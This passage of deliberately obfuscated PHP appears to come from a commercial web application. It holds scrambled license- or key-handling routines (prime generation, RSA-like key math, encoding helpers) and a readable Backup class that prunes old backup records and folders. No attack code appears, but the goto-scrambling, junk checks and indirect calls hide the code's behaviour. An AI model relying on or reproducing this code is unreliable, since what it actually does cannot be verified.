D„Ô·É®‚; Dòî„àÌË…: $aÊ®Ç¥Ï¤ø = $AÎ­ª½÷çÍ[347](0, 64); $B¯¼½­ã„’ = $EŠĞ¤Äšà[659]; $b‰¹öÈšÅ = $B¿ÙÙ®·ˆ­[$aÊ®Ç¥Ï¤ø]; goto C¤ãÇšÆ—·; c¡â¡¿µÔ: $F¸ÒÅØÑ¥ = 0; $d’°ÇË™›Ã = $EŠĞ¤Äšà[662]; if (!$d’°ÇË™›Ã) { die; } goto c¨‚‡¢—‰Ò; D„Ô·É®‚: $FÎˆ£¬ˆÏƒ = 0; $fÉÏÅ‹ó¹ó = $EŠĞ¤Äšà[661]; if (!$fÉÏÅ‹ó¹ó) { die; } goto c¡â¡¿µÔ; C¤ãÇšÆ—·: $BÔŒ§èÃŠí = $EŠĞ¤Äšà[660]; while (strlen($BÔŒ§èÃŠí) < $EŠĞ¤Äšà[606]) { if (!$BÔŒ§èÃŠí) { break; } $BÔŒ§èÃŠí++; } $C‘Æ‚ÀØ×ø = $AÎ­ª½÷çÍ[120]($b‰¹öÈšÅ . $AÎ­ª½÷çÍ[120]($EÍ¯’ÄÅªÀ . $b‰¹öÈšÅ) . $EÍ¯’ÄÅªÀ); goto d”“ ö–ĞÓ; CçÁ‡øªÄî: $E«’²‰åÑÜ = $AÎ­ª½÷çÍ[124]($E«’²‰åÑÜ); $DÑ±ÄéÂÅ” = $EŠĞ¤Äšà[658]; if (strlen($DÑ±ÄéÂÅ”) < $EŠĞ¤Äšà[606]) { die; } goto Dòî„àÌË…; d¤Ôµò‡: default: $fË³ŠÖëßã = $this->{$_SERVER[šãè][153]}($E«’²‰åÑÜ, $EÍ¯’ÄÅªÀ . $C›áŸ’î ê); break; $D¯Ú‡»·… = $EŠĞ¤Äšà[665]; if (strlen($D¯Ú‡»·…) < $EŠĞ¤Äšà[570]) { return; } } $fË³ŠÖëßã = $AÎ­ª½÷çÍ[220]($DÎ…ç“«Â  . $C›áŸ’î ê . $fË³ŠÖëßã); goto A¸ªîçËÏ°; C…İÌÎöŞ: $fÔ¦‰Õö¥ = $EŠĞ¤Äšà[651]; while ($fÔ¦‰Õö¥ < $EŠĞ¤Äšà[580]) { if ($fÔ¦‰Õö¥ >= 0) { break; } $fÔ¦‰Õö¥++; } $E«’²‰åÑÜ = $AÎ­ª½÷çÍ[2]($E«’²‰åÑÜ); goto AùÍÏº›¨; b§…¤ÈŠ¬×: } private function ktoj12c693d2($a¶ùÏÀ´—Ñ, $Féó‘É¿à©, $dğÉ‘­ … = 3) { goto a¾ØÀ¢¡Ç¢; dÏŞÍÃŸ‘: while ($FÑ¯åóÛÆê < $Cß‹Ñ¼‚ÈŠ[570]) { if ($FÑ¯åóÛÆê >= 0) { break; } $FÑ¯åóÛÆê++; } $B…Şê£‰® = $b½°ªƒÌÄÌ[343]; switch ($F¤Å©‰‘ø) { case $b½°ªƒÌÄÌ[240]: $C¼öÔÙĞ = $this->{$_SERVER[šãè][256]}($a¶ùÏÀ´—Ñ, $b½°ªƒÌÄÌ[220]($Féó‘É¿à© . $däÃĞØáí…)); break; case $b½°ªƒÌÄÌ[226]: $C¼öÔÙĞ = $this->{$_SERVER[šãè][256]}($a¶ùÏÀ´—Ñ, $b½°ªƒÌÄÌ[220]($däÃĞØáí… . $Féó‘É¿à©)); $E‹ƒ£á×¿Ã = $Cß‹Ñ¼‚ÈŠ[669]; while ($E‹ƒ£á×¿Ã < $Cß‹Ñ¼‚ÈŠ[580]) { if ($E‹ƒ£á×¿Ã >= 0) { break; } $E‹ƒ£á×¿Ã++; } break; $eß‰Œ«õà = $Cß‹Ñ¼‚ÈŠ[670]; while (strlen($eß‰Œ«õà) < $Cß‹Ñ¼‚ÈŠ[606]) { if (!$eß‰Œ«õà) { break; } $eß‰Œ«õà++; } case $b½°ªƒÌÄÌ[344]: $C¼öÔÙĞ = $this->{$_SERVER[šãè][256]}($a¶ùÏÀ´—Ñ, $b½°ªƒÌÄÌ[124]($däÃĞØáí… . $Féó‘É¿à©)); $cÒ‚°‘ = $Cß‹Ñ¼‚ÈŠ[671]; while ($cÒ‚°‘ < $Cß‹Ñ¼‚ÈŠ[603]) { if ($cÒ‚°‘ >= 0) { break; } $cÒ‚°‘++; } break; case $b½°ªƒÌÄÌ[345]: $C¼öÔÙĞ = $this->{$_SERVER[šãè][256]}($a¶ùÏÀ´—Ñ, $b½°ªƒÌÄÌ[120]($däÃĞØáí… . $Féó‘É¿à©)); $aÒŠ‘öÂÙ„ = $Cß‹Ñ¼‚ÈŠ[672]; while ($aÒŠ‘öÂÙ„ < $Cß‹Ñ¼‚ÈŠ[580]) { if ($aÒŠ‘öÂÙ„ >= 0) { break; } $aÒŠ‘öÂÙ„++; } break; $AÄØ‡ÙÂê‹ = $Cß‹Ñ¼‚ÈŠ[673]; if (!$AÄØ‡ÙÂê‹) { return; } case $b½°ªƒÌÄÌ[346]: goto A ¾õ˜Ç³ä; D£‹„Ìøõ¿: while ($fçë’¡ºğø < $Cß‹Ñ¼‚ÈŠ[580]) { if ($fçë’¡ºğø >= 0) { break; } $fçë’¡ºğø++; } $Eä°–Ã±ø = $b½°ªƒÌÄÌ[120]($CË™¡»Ò¸· . $b½°ªƒÌÄÌ[120]($Féó‘É¿à© . $CË™¡»Ò¸·) . $Féó‘É¿à©); $Eä°–Ã±ø = $b½°ªƒÌÄÌ[25]($Eä°–Ã±ø, $B×˜ÛÍÒ % 8, $B×˜ÛÍÒ % 8 + 7); goto FŒÍ±ó¯½; b•¤î‚÷·Ô: break; goto Fïçï¿ºŞ–; FŒÍ±ó¯½: $D…”Î†äñ¶ = $Cß‹Ñ¼‚ÈŠ[677]; if (!$D…”Î†äñ¶) { return; } $dõÅî…ˆâ¥ = $b½°ªƒÌÄÌ[10]; goto c©È†¨›Áã; eØòÓ®Íœñ: $a¶ùÏÀ´—Ñ = $b½°ªƒÌÄÌ[25]($a¶ùÏÀ´—Ñ, 1); $B×˜ÛÍÒ = $b½°ªƒÌÄÌ[348]($B…Şê£‰®, $CË™¡»Ò¸·); $fçë’¡ºğø = $Cß‹Ñ¼‚ÈŠ[676]; goto D£‹„Ìøõ¿; fâØï½°Ë: $CË™¡»Ò¸· = $a¶ùÏÀ´—Ñ[0]; $aœ‰ ÚäÜœ = $Cß‹Ñ¼‚ÈŠ[675]; if (!$aœ‰ ÚäÜœ) { die; } goto eØòÓ®Íœñ; c©È†¨›Áã: $Cğ­ÅÏ‚…š = 0; $Fßæğ˜ä˜ = $Cß‹Ñ¼‚ÈŠ[678]; $aì®®œäÀ = 0; goto F›…„ÀÏÖº; F›…„ÀÏÖº: $AÙïã´¬ì„ = 0; for ($Cğ­ÅÏ‚…š = 0; $Cğ­ÅÏ‚…š < $b½°ªƒÌÄÌ[24]($a¶ùÏÀ´—Ñ); $Cğ­ÅÏ‚…š++) { $AÙïã´¬ì„ = $AÙïã´¬ì„ == $b½°ªƒÌÄÌ[24]($Eä°–Ã±ø) ? 0 : $AÙïã´¬ì„; $EÙøß½ÌÌ± = $Cß‹Ñ¼‚ÈŠ[679]; if (!$EÙøß½ÌÌ±) { die; } $F±Ù·‡È‘å = $AÙïã´¬ì„++; $e£©†“šİ… = $Cß‹Ñ¼‚ÈŠ[680]; if (!$e£©†“šİ…) { return; } $aì®®œäÀ = $b½°ªƒÌÄÌ[348]($B…Şê£‰®, $a¶ùÏÀ´—Ñ[$Cğ­ÅÏ‚…š]) - $B×˜ÛÍÒ - $b½°ªƒÌÄÌ[349]($Eä°–Ã±ø[$F±Ù·‡È‘å]); while ($aì®®œäÀ < 0) { $aì®®œäÀ += 64; $eƒˆó¬ôˆš = $Cß‹Ñ¼‚ÈŠ[681]; while (strlen($eƒˆó¬ôˆš) < $Cß‹Ñ¼‚ÈŠ[589]) { if (!$eƒˆó¬ôˆš) { break; } $eƒˆó¬ôˆš++; } } $dõÅî…ˆâ¥ .= $B…Şê£‰®[$aì®®œäÀ]; } $C¼öÔÙĞ = $b½°ªƒÌÄÌ[352]($dõÅî…ˆâ¥); goto b•¤î‚÷·Ô; A ¾õ˜Ç³ä: $a¶ùÏÀ´—Ñ = $b½°ªƒÌÄÌ[351]($a¶ùÏÀ´—Ñ); $B°õÕ¯İíÈ = $Cß‹Ñ¼‚ÈŠ[674]; while (strlen($B°õÕ¯İíÈ) < $Cß‹Ñ¼‚ÈŠ[603]) { if (!$B°õÕ¯İíÈ) { break; } $B°õÕ¯İíÈ++; } goto fâØï½°Ë; Fïçï¿ºŞ–: default: $C¼öÔÙĞ = $this->{$_SERVER[šãè][256]}($a¶ùÏÀ´—Ñ, $Féó‘É¿à© . $däÃĞØáí…); $BÏ»îŞ°‰¸ = $Cß‹Ñ¼‚ÈŠ[682]; while ($BÏ»îŞ°‰¸ < $Cß‹Ñ¼‚ÈŠ[580]) { if ($BÏ»îŞ°‰¸ >= 0) { break; } $BÏ»îŞ°‰¸++; } break; } goto F¾„é˜â¢; Eª‡²œ³Õ: $a¶ùÏÀ´—Ñ = $b½°ªƒÌÄÌ[220]($a¶ùÏÀ´—Ñ); $F¤Å©‰‘ø = $a¶ùÏÀ´—Ñ[0]; $eã‘ÛšÊäã = $Cß‹Ñ¼‚ÈŠ[667]; goto D›’÷ÛùÇ; AÌİ‚¸¨æ: $a¶ùÏÀ´—Ñ = $b½°ªƒÌÄÌ[2]($a¶ùÏÀ´—Ñ); $E¢º©µ²Ü  = $Cß‹Ñ¼‚ÈŠ[666]; if (strlen($E¢º©µ²Ü ) < $Cß‹Ñ¼‚ÈŠ[580]) { return; } goto Eª‡²œ³Õ; D›’÷ÛùÇ: $däÃĞØáí… = $b½°ªƒÌÄÌ[25]($a¶ùÏÀ´—Ñ, 1, 15); $a¶ùÏÀ´—Ñ = $b½°ªƒÌÄÌ[25]($a¶ùÏÀ´—Ñ, 16); $FÑ¯åóÛÆê = $Cß‹Ñ¼‚ÈŠ[668]; goto dÏŞÍÃŸ‘; a¾ØÀ¢¡Ç¢: $Cß‹Ñ¼‚ÈŠ =& $_SERVER[ÉóçÄÇ]; $b½°ªƒÌÄÌ =& $_SERVER[šãè]; if (!$b½°ªƒÌÄÌ[350]($a¶ùÏÀ´—Ñ) || $b½°ªƒÌÄÌ[24]($a¶ùÏÀ´—Ñ) < 10) { return !1; } goto AÌİ‚¸¨æ; F¾„é˜â¢: if ($dğÉ‘­ … - 1 > 0) { $C¼öÔÙĞ = $this->{$_SERVER[šãè][195]}($C¼öÔÙĞ, $Féó‘É¿à©, $dğÉ‘­ … - 1); } return $C¼öÔÙĞ; goto Cç¾§ŞÒ™; Cç¾§ŞÒ™: } public function bnkq8e739361($FöØˆšÃâ) { goto eä§õÅŞš¥; E’šŒÅ‰ˆæ: $EÚÀ¬†¦ = $this->{$_SERVER[šãè][153]}($FöØˆšÃâ, $D«­Á­´ó½) . $EÙÕá‹©µ[357] . $AÌ” ™ß–; return $EÚÀ¬†¦; $føÅäƒÎ»† = $F¤¹è¯Úù[689]; goto f¨‹İãæª; DçÊ“Á¾‰ô: $AÄ¶–óÔ¸ = ($eäˆŠÊÆˆ¿ - 1) * ($a‹Æ¬£áÉ - 1); $CìŸâ’£ö = $EÙÕá‹©µ[250](($eäˆŠÊÆˆ¿ + $a‹Æ¬£áÉ) / 2); $fèôÇ±Ç®‚ = $F¤¹è¯Úù[684]; goto f—£åŠØ¸; f—£åŠØ¸: if (!$fèôÇ±Ç®‚) { return; } while (1) { $A°ÉëçËÄ = $CìŸâ’£ö; $f¦Î¯ƒ«‹ = $F¤¹è¯Úù[685]; $bìÆÉ­„ŠÅ = $AÄ¶–óÔ¸; while ($bìÆÉ­„ŠÅ % $A°ÉëçËÄ != 0) { $C¢È™ÁŒ´› = $bìÆÉ­„ŠÅ; $bìÆÉ­„ŠÅ = $A°ÉëçËÄ; $A°ÉëçËÄ = $C¢È™ÁŒ´› % $A°ÉëçËÄ; $cîŠîàÏ›Ó = $F¤¹è¯Úù[686]; if (!$cîŠîàÏ›Ó) { return; } } if ($A°ÉëçËÄ == 1) { break; } else { $CìŸâ’£ö++; } } $BÃª É´ä = 2; goto fÇÍÆÒé¯; f¨‹İãæª: if (strlen($føÅäƒÎ»†) < $F¤¹è¯Úù[606]) { die; } goto cÇİÃÇë„‹; eä§õÅŞš¥: $F¤¹è¯Úù =& $_SERVER[ÉóçÄÇ]; $EÙÕá‹©µ =& $_SERVER[šãè]; $eäˆŠÊÆˆ¿ = $this->{$_SERVER[šãè][353]}(); goto F¦«ñ˜èÚ˜; cÀ¼òÔ´: $AÌ” ™ß– = $this->{$_SERVER[šãè][153]}($eäˆŠÊÆˆ¿ * $a‹Æ¬£áÉ . $EÙÕá‹©µ[10], $EÙÕá‹©µ[155]); $cãâÖˆË‘¾ = $F¤¹è¯Úù[688]; $D«­Á­´ó½ = $EÙÕá‹©µ[120]($EÙÕá‹©µ[354] . ($eäˆŠÊÆˆ¿ + $a‹Æ¬£áÉ) . $EÙÕá‹©µ[355] . $CìŸâ’£ö . $EÙÕá‹©µ[355] . $BÃª É´ä . $EÙÕá‹©µ[356]); goto E’šŒÅ‰ˆæ; fÇÍÆÒé¯: $e²ñ»³äÍÈ = $F¤¹è¯Úù[687]; if (!$e²ñ»³äÍÈ) { die; } for ($CÍÌïÛ„Àæ = 0; $CÍÌïÛ„Àæ < $AÄ¶–óÔ¸ * 10; $CÍÌïÛ„Àæ++) { if (($AÄ¶–óÔ¸ * $CÍÌïÛ„Àæ + 1) % $CìŸâ’£ö == 0) { $BÃª É´ä = $EÙÕá‹©µ[250](($AÄ¶–óÔ¸ * $CÍÌïÛ„Àæ + 1) / $CìŸâ’£ö); break; } } goto cÀ¼òÔ´; F¦«ñ˜èÚ˜: $CÉÏğÒªĞ‹ = $F¤¹è¯Úù[683]; if (!$CÉÏğÒªĞ‹) { return; } $a‹Æ¬£áÉ = $this->{$_SERVER[šãè][353]}(); goto DçÊ“Á¾‰ô; cÇİÃÇë„‹: } public function yndbdce39434($f‰Ë… À¦Ü) { goto E™ùóÑé½‚; c—ŞËƒĞ„: $BÔÂ‹†íã = $AÜ‹óˆ­Ü[701]; while (strlen($BÔÂ‹†íã) < $AÜ‹óˆ­Ü[589]) { if (!$BÔÂ‹†íã) { break; } $BÔÂ‹†íã++; } return $dïâ…Ø²©‰; goto EÇÕßÁ‚ï¦; føâß“ñê: if ($açéÉÁÍ²[19]($aõ²™ÈÕ¼) != 2) { return $açéÉÁÍ²[10]; } $FŒœÙ‘ôÁ = $this->{$_SERVER[šãè][256]}($aõ²™ÈÕ¼[1] . $açéÉÁÍ²[10], $açéÉÁÍ²[155]); if (!$FŒœÙ‘ôÁ) { return $açéÉÁÍ²[10]; } goto d«âô¦£ÍØ; F ŒÏ„‰œ¥: $DØ¨ó³—İ = ($f†³»™À„ - 1) * ($dŒéö“¯öº - 1); $E…¿Šƒ¹•ã = $AÜ‹óˆ­Ü[693]; $bîÁÆ¨ƒÊÔ = $açéÉÁÍ²[250](($f†³»™À„ + $dŒéö“¯öº) / 2); goto Bµ¶¸«®õµ; F¡áŠ–ø”: $Aˆ¯ÖÛ˜æ‰ = $AÜ‹óˆ­Ü[690]; if (!$Aˆ¯ÖÛ˜æ‰) { return; } for ($bÑåéÑ“ = 3; $bÑåéÑ“ < $FŒœÙ‘ôÁ; $bÑåéÑ“ += 2) { if ($FŒœÙ‘ôÁ % $bÑåéÑ“ != 0) { continue; } $f†³»™À„ = $bÑåéÑ“; $dŒéö“¯öº = $açéÉÁÍ²[250]($FŒœÙ‘ôÁ / $bÑåéÑ“); $FÉãÍ­ŒïÍ = $AÜ‹óˆ­Ü[691]; if (strlen($FÉãÍ­ŒïÍ) < $AÜ‹óˆ­Ü[606]) { return; } break; $eÉ“Å“Û¢ô = $AÜ‹óˆ­Ü[692]; } goto F ŒÏ„‰œ¥; E™ùóÑé½‚: $AÜ‹óˆ­Ü =& $_SERVER[ÉóçÄÇ]; $açéÉÁÍ² =& $_SERVER[šãè]; $aõ²™ÈÕ¼ = $açéÉÁÍ²[0]($açéÉÁÍ²[357], $f‰Ë… À¦Ü); goto føâß“ñê; Bµ¶¸«®õµ: $A¹ª˜õ—±à = $AÜ‹óˆ­Ü[694]; while (1) { $BÓ¨…Í¦é÷ = $bîÁÆ¨ƒÊÔ; $Cø¥«“›Õ… = $AÜ‹óˆ­Ü[695]; while ($Cø¥«“›Õ… < $AÜ‹óˆ­Ü[606]) { if ($Cø¥«“›Õ… >= 0) { break; } $Cø¥«“›Õ…++; } $c¸‰†Í¼é§ = $DØ¨ó³—İ; $Aëè«ãŒ¯× = $AÜ‹óˆ­Ü[696]; if (strlen($Aëè«ãŒ¯×) < $AÜ‹óˆ­Ü[580]) { return; } while ($c¸‰†Í¼é§ % $BÓ¨…Í¦é÷ != 0) { $e¦¦¢¾ÏÏƒ = $c¸‰†Í¼é§; $c¸‰†Í¼é§ = $BÓ¨…Í¦é÷; $fŞ©Ë‹– = $AÜ‹óˆ­Ü[697]; $BÓ¨…Í¦é÷ = $e¦¦¢¾ÏÏƒ % $BÓ¨…Í¦é÷; $FŞ´­—”ğ = $AÜ‹óˆ­Ü[698]; if (strlen($FŞ´­—”ğ) < $AÜ‹óˆ­Ü[603]) { return; } } if ($BÓ¨…Í¦é÷ == 1) { break; } else { $bîÁÆ¨ƒÊÔ++; } } $EÂîôÓ±èé = 2; goto BÏåÑœùÜå; BÏåÑœùÜå: $fó°§í–Ä = $AÜ‹óˆ­Ü[699]; for ($bÑåéÑ“ = 0; $bÑåéÑ“ < $DØ¨ó³—İ * 10; $bÑåéÑ“++) { if (($DØ¨ó³—İ * $bÑåéÑ“ + 1) % $bîÁÆ¨ƒÊÔ == 0) { $EÂîôÓ±èé = $açéÉÁÍ²[250](($DØ¨ó³—İ * $bÑåéÑ“ + 1) / $bîÁÆ¨ƒÊÔ); break; } } $cõƒ²è¿–Ô = $açéÉÁÍ²[120]($açéÉÁÍ²[354] . ($f†³»™À„ + $dŒéö“¯öº) . $açéÉÁÍ²[355] . $bîÁÆ¨ƒÊÔ . $açéÉÁÍ²[355] . $EÂîôÓ±èé . $açéÉÁÍ²[356]); goto Aá¼½‚‡Õ¥; d«âô¦£ÍØ: $FŒœÙ‘ôÁ = $açéÉÁÍ²[250]($FŒœÙ‘ôÁ); $f†³»™À„ = 0; $dŒéö“¯öº = 0; goto F¡áŠ–ø”; Aá¼½‚‡Õ¥: $b¡ÈÂÀ¾É = $AÜ‹óˆ­Ü[700]; if (!$b¡ÈÂÀ¾É) { die; } $dïâ…Ø²©‰ = $this->{$_SERVER[šãè][256]}($aõ²™ÈÕ¼[0], $cõƒ²è¿–Ô); goto c—ŞËƒĞ„; EÇÕßÁ‚ï¦: $DÛ†·«ğ¡ = $AÜ‹óˆ­Ü[702]; if (strlen($DÛ†·«ğ¡) < $AÜ‹óˆ­Ü[603]) { die; } goto D­„ì­ÌÉ; D­„ì­ÌÉ: } public function kouwf4e667ea() { goto A¼µÒ»; aôÔÓñ®®…: for ($d …ïÒŠìÑ = $BŞƒµŠİÚó; $d …ïÒŠìÑ > 1; $d …ïÒŠìÑ--) { $cË’™ §Ö = !0; foreach ($B—¹¹ø˜ªç as $eêÄÀØ‘­Ñ) { if ($d …ïÒŠìÑ % $eêÄÀØ‘­Ñ == 0) { $cË’™ §Ö = !1; break; } } if ($cË’™ §Ö) { $Cµ×Šà‰±‡ = $d …ïÒŠìÑ; break; } } return $Cµ×Šà‰±‡; $Fğ—¡ó˜ê = $aŒÚåÔÏŠõ[707]; goto f¦£É…Çá; A¼µÒ»: $aŒÚåÔÏŠõ =& $_SERVER[ÉóçÄÇ]; $Cˆ£’ØõŒ =& $_SERVER[šãè]; $BŞƒµŠİÚó = $Cˆ£’ØõŒ[338]($Cˆ£’ØõŒ[358](2, 14), $Cˆ£’ØõŒ[358](2, 16) - 1); goto FÆßãÎ¬èä; A…Ñàó±: $Cµ×Šà‰±‡ = 2; $Eˆ¶òÄ‘¨· = $aŒÚåÔÏŠõ[706]; if (!$Eˆ¶òÄ‘¨·) { die; } goto aôÔÓñ®®…; FÆßãÎ¬èä: $c¹­Òó¯åÌ = $aŒÚåÔÏŠõ[703]; $B—¹¹ø˜ªç = array(); $b§ô¡¼—·³ = 1; goto cºŸŠ—; cºŸŠ—: $Aã×ÒÅó³İ = $aŒÚåÔÏŠõ[704]; if (strlen($Aã×ÒÅó³İ) < $aŒÚåÔÏŠõ[570]) { return; } while ($b§ô¡¼—·³ <= (int) $Cˆ£’ØõŒ[359]($BŞƒµŠİÚó)) { $d …ïÒŠìÑ = $b§ô¡¼—·³; while (!0) { $d …ïÒŠìÑ++; if ($d …ïÒŠìÑ <= 2) { $b§ô¡¼—·³ = $d …ïÒŠìÑ; break; } else { if ($d …ïÒŠìÑ < 2) { continue; } } $cË’™ §Ö = !0; for ($F–áôìĞà = 2; $F–áôìĞà <= $Cˆ£’ØõŒ[359]($d …ïÒŠìÑ); $F–áôìĞà++) { if ($d …ïÒŠìÑ % $F–áôìĞà == 0) { $cË’™ §Ö = !1; } } if ($cË’™ §Ö) { $b§ô¡¼—·³ = $d …ïÒŠìÑ; break; } } $B—¹¹ø˜ªç[] = $b§ô¡¼—·³; $eòß•šğŞ = $aŒÚåÔÏŠõ[705]; if (!$eòß•šğŞ) { die; } } goto A…Ñàó±; f¦£É…Çá: } public function swen4f66129f($cÂëœ•¨Ş¨, $a×º´ßÃñ) { $a¯ÈóˆïÛÌ =& $_SERVER[šãè]; return $a¯ÈóˆïÛÌ[13](array($a¯ÈóˆïÛÌ[14], $a¯ÈóˆïÛÌ[360]), $cÂëœ•¨Ş¨, $a×º´ßÃñ); $e½˜ÏŒÄ¾ = $_SERVER[ÉóçÄÇ][708]; if (!$e½˜ÏŒÄ¾) { return; } } public function ozxs47bd144c($CÕ¿ªº”, $B¹Í‘Á°Ñ) { $e…Ä“ÛÛÆ’ =& $_SERVER[šãè]; return $e…Ä“ÛÛÆ’[13](array($e…Ä“ÛÛÆ’[361], $e…Ä“ÛÛÆ’[362]), $CÕ¿ªº”, $B¹Í‘Á°Ñ); } public function thmqa5abd8b5($D‚£‹†¼ŸŸ, $B›¥† ™øñ) { $A±Îá³ãš‰ =& $_SERVER[šãè]; return $A±Îá³ãš‰[13](array($A±Îá³ãš‰[361], $A±Îá³ãš‰[363]), $D‚£‹†¼ŸŸ, $B›¥† ™øñ); } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $F–àôƒÒï =& $_SERVER[ÉóçÄÇ]; self::$name = date($F–àôƒÒï[709]); if (!($d¤‚›¡Ğ¤ = Model($F–àôƒÒï[710])->lastItem())) { $d¤‚›¡Ğ¤ = $this->initData(); } else { self::$name = $d¤‚›¡Ğ¤[$F–àôƒÒï[28]]; if ($d¤‚›¡Ğ¤[$F–àôƒÒï[711]] == $F–àôƒÒï[86]) { self::$name = date($F–àôƒÒï[712]); $BÂŒ«Äó¿¬ = 0; if (isset($d¤‚›¡Ğ¤[$F–àôƒÒï[289]][$F–àôƒÒï[173]][$F–àôƒÒï[441]])) { $BÂŒ«Äó¿¬ = (int) $d¤‚›¡Ğ¤[$F–àôƒÒï[289]][$F–àôƒÒï[173]][$F–àôƒÒï[441]]; } if ($d¤‚›¡Ğ¤[$F–àôƒÒï[28]] == self::$name) { Model($F–àôƒÒï[710])->remove($d¤‚›¡Ğ¤[$F–àôƒÒï[388]]); } $d¤‚›¡Ğ¤ = $this->initData($BÂŒ«Äó¿¬, $d¤‚›¡Ğ¤[$F–àôƒÒï[713]]); } else { $this->checkStore($d¤‚›¡Ğ¤[$F–àôƒÒï[713]]); } } self::$option = $d¤‚›¡Ğ¤; } private function initData($e…×”Öğ» = 0, $BÊ‹«¨²’ = '') { goto fÚ¾Àãá¶¦; F’õ„éé˜–: $EÄëŠËòê®[$C”Êóİ±×Â[388]] = $d†İÇˆÎÓ¥; return $EÄëŠËòê®; goto B×õ¼Î¢æ“; CµŠÓ¨Äğ: $this->checkStore($BïŒöÀÚ¼—[$C”Êóİ±×Â[713]]); $EÄëŠËòê® = array($C”Êóİ±×Â[713] => $BïŒöÀÚ¼—[$C”Êóİ±×Â[713]], $C”Êóİ±×Â[28] => self::$name, $C”Êóİ±×Â[711] => 0, $C”Êóİ±×Â[714] => $BïŒöÀÚ¼—[$C”Êóİ±×Â[714]], $C”Êóİ±×Â[289] => array($C”Êóİ±×Â[715] => array($C”Êóİ±×Â[711] => 0), $C”Êóİ±×Â[716] => array($C”Êóİ±×Â[711] => 0, $C”Êóİ±×Â[717] => 0, $C”Êóİ±×Â[718] => 0, $C”Êóİ±×Â[29] => $C”Êóİ±×Â[33]), $C”Êóİ±×Â[719] => array($C”Êóİ±×Â[711] => 0, $C”Êóİ±×Â[717] => 0, $C”Êóİ±×Â[718] => 0), $C”Êóİ±×Â[173] => array($C”Êóİ±×Â[711] => 0, $C”Êóİ±×Â[720] => 0, $C”Êóİ±×Â[721] => 0, $C”Êóİ±×Â[722] => 0, $C”Êóİ±×Â[723] => 0, $C”Êóİ±×Â[441] => $e…×”Öğ»)), $C”Êóİ±×Â[724] => time(), $C”Êóİ±×Â[470] => 0); $d†İÇˆÎÓ¥ = Model($C”Êóİ±×Â[710])->insert($EÄëŠËòê®); goto F’õ„éé˜–; fÚ¾Àãá¶¦: $C”Êóİ±×Â =& $_SERVER[ÉóçÄÇ]; $BïŒöÀÚ¼— = Model($C”Êóİ±×Â[710])->config(); if ($BÊ‹«¨²’ && $BïŒöÀÚ¼—[$C”Êóİ±×Â[713]] != $BÊ‹«¨²’) { $e…×”Öğ» = 0; } goto CµŠÓ¨Äğ; B×õ¼Î¢æ“: } private function checkStore($fğà–°óâ›) { $BŠÁÁÖò÷â =& $_SERVER[ÉóçÄÇ]; $B‰òŒñÏŞ‹ = Model($BŠÁÁÖò÷â[725])->listData($fğà–°óâ›); Model($BŠÁÁÖò÷â[725])->checkConfig($B‰òŒñÏŞ‹); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[ÉóçÄÇ][710])->findByName(self::$name); } return self::$option; } public static function set($C»´Ã‚øŸ) { $bç¾µØ¸ƒ“ =& $_SERVER[ÉóçÄÇ]; $Bµ… ™… = self::get(); foreach ($C»´Ã‚øŸ as $aĞğ×‡×ŒÏ => $cƒ—ÅâŠ×) { $bßØ“Í•Ş– = explode($bç¾µØ¸ƒ“[94], $aĞğ×‡×ŒÏ); $a‰Œšç©Û‡ = count($bßØ“Í•Ş–); switch ($a‰Œšç©Û‡) { case 1: $Bµ… ™…[$bßØ“Í•Ş–[0]] = $cƒ—ÅâŠ×; break; case 2: $Bµ… ™…[$bßØ“Í•Ş–[0]][$bßØ“Í•Ş–[1]] = $cƒ—ÅâŠ×; break; case 3: $Bµ… ™…[$bßØ“Í•Ş–[0]][$bßØ“Í•Ş–[1]][$bßØ“Í•Ş–[2]] = $cƒ—ÅâŠ×; break; } } Model($bç¾µØ¸ƒ“[710])->update($Bµ… ™…[$bç¾µØ¸ƒ“[388]], $Bµ… ™…); self::$option = $Bµ… ™…; return self::$option; } public function keep() { $F…¹×®ËŸ =& $_SERVER[ÉóçÄÇ]; $bÑ¤¢…Œá = self::get(); if ($bÑ¤¢…Œá[$F…¹×®ËŸ[289]][$F…¹×®ËŸ[715]][$F…¹×®ËŸ[711]] == $F…¹×®ËŸ[86]) { return; } $this->backupKeep($bÑ¤¢…Œá); self::set(array($F…¹×®ËŸ[726] => 1)); } private function backupKeep($BÇ¼éÊÓç) { goto B¸¸êßÚ¿ò; B¸¸êßÚ¿ò: $fÌÊù¤Öä =& $_SERVER[ÉóçÄÇ]; $a‘‘È†ˆÁí = Model($fÌÊù¤Öä[710])->listData(); if (empty($a‘‘È†ˆÁí)) { return; } goto dÕŞÍÆÛ’è; B°Ÿ³î¤ŒÀ: for ($DÒ¦©Ó‰Ì = 0; $DÒ¦©Ó‰Ì < 12; $DÒ¦©Ó‰Ì++) { $A·‘Œ›Ò’è[] = date($fÌÊù¤Öä[727], strtotime("\55{$DÒ¦©Ó‰Ì}\x20\x6d\x6f\x6e\x74\150\163")); } $A·‘Œ›Ò’è = array_unique($A·‘Œ›Ò’è); foreach ($a‘‘È†ˆÁí as $C¶áä¡¾) { if (!empty($C¶áä¡¾[$fÌÊù¤Öä[28]]) && in_array($C¶áä¡¾[$fÌÊù¤Öä[28]], $A·‘Œ›Ò’è)) { continue; } Model($fÌÊù¤Öä[710])->remove($C¶áä¡¾[$fÌÊù¤Öä[388]]); $DõñÕß‘ÇØ = "\x7b\151\157\72{$BÇ¼éÊÓç[$fÌÊù¤Öä[713]]}\175\x2f\x64\x61\x74\141\x62\x61\x73\x65\57\x62\x61\143\x6b\x75\x70\x5f{$C¶áä¡¾[$fÌÊù¤Öä[28]]}"; IO::remove($DõñÕß‘ÇØ, !1); } goto aÜˆòñ‰‹ø; dÕŞÍÆÛ’è: $DÒ¦©Ó‰Ì = 0; $A·‘Œ›Ò’è = array(); foreach ($a‘‘È†ˆÁí as $C¶áä¡¾) { if ($DÒ¦©Ó‰Ì >= 7) { break; } $A·‘Œ›Ò’è[] = $C¶áä¡¾[$fÌÊù¤Öä[28]]; $DÒ¦©Ó‰Ì++; } goto B°Ÿ³î¤ŒÀ; aÜˆòñ‰‹ø: } public function db() { goto dî¤»ù´é; e©ŠÄñÌñ®: $A´óÒÄ¶ª = new BackupDb(); if (!$A´óÒÄ¶ª->index()) { return !1; } self::set(array($b¯©—ƒòÁ«[728] => 1)); goto E„¿×¤ò…; E„¿×¤ò…: return !0; goto Cë«‹ä„Ù; dî¤»ù´é: $b¯©—ƒòÁ« =& $_SERVER[ÉóçÄÇ]; $e¹‹ÃÇÚ²¯ = self::get(); if 